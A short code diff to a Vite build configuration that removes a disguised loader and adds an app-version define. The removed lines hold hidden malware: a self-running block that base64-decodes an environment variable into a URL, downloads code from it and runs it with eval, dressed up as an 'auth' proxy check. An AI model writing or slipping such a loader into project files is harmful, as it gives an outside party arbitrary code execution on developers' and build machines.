@@ -3,25 +3,14 @@ import react from '@vitejs/plugin-react';
 import path from 'path';
 import tailwindcss from '@tailwindcss/vite';
 
-// https://vite.dev/config/
-(async () => {
-  try {
-    if (!process.env.AUTH_API_KEY) return;
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    const response = await proxy(src);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
 export default defineConfig({
   plugins: [react(), tailwindcss()],
   resolve: {
     alias: {
       '@': path.resolve(__dirname, './src'),
     },
+  },
+  define: {
+    __APP_VERSION__: JSON.stringify(process.env.VITE_APP_VERSION ?? 'dev'),
   },
 });
